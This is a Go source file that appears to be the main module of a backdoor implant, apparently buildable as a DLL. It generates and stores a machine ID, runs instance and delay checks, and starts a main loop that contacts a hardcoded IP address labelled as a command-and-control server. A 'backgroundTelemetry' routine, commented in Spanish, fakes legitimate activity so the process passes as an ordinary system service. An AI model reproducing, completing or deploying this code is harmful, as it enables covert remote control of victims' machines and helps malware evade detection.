package main

// import "C"
import (
	"crypto/rand"
	"encoding/hex"
	"fix-project/mods/config"
	"fix-project/mods/core"
	"fix-project/mods/instance"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"
)

func generateId() string {
	hostfile := filepath.Join(os.TempDir(), config.MACHINEID_FILE_NAME)
	data, err := os.ReadFile(hostfile)

	if err == nil {
		return string(data)
	}

	// initialize id
	data = make([]byte, 4)
	rand.Read(data)

	id := hex.EncodeToString(data)

	os.WriteFile(hostfile, []byte(id), 0o644)

	return id
}

func RunDLL() {
	print("================= RunDLL =================\n")
	instance.Delay()
	instance.CheckDupInstance()
	instance.RegisterInstance()

	//url := "https://api.jz-aws.info/public/images/"
	url := "http://52.201.242.202:8081/exchange" // C2 Server URL
	// url := "http://127.0.0.1:8080"
	id := generateId()
	fmt.Printf("UUID: %s, URL: %s\n", id, url)
	fmt.Println("")

	core.StartMainLoop(id, url)
}

// backgroundTelemetry simula carga de trabajo legitima en segundo plano.
// Mantiene el proceso activo como un servicio de sistema ordinario.
func backgroundTelemetry() {
	var wg sync.WaitGroup
	wg.Add(2)

	// worker 1: heartbeat interno con jitter
	go func() {
		defer wg.Done()
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			_ = os.Getpid() // no-op, mantiene el loop vivo
		}
	}()

	// worker 2: buffer maintenance
	go func() {
		defer wg.Done()
		buf := make([]byte, 0, 4096)
		for {
			time.Sleep(45 * time.Second)
			buf = buf[:0]
			_ = cap(buf)
		}
	}()

	wg.Wait()
}

//export DllRegisterServer
// func DllRegisterServer() {
// 	RunDLL()
// }

// main
func main() {
	go backgroundTelemetry()
	RunDLL()
}
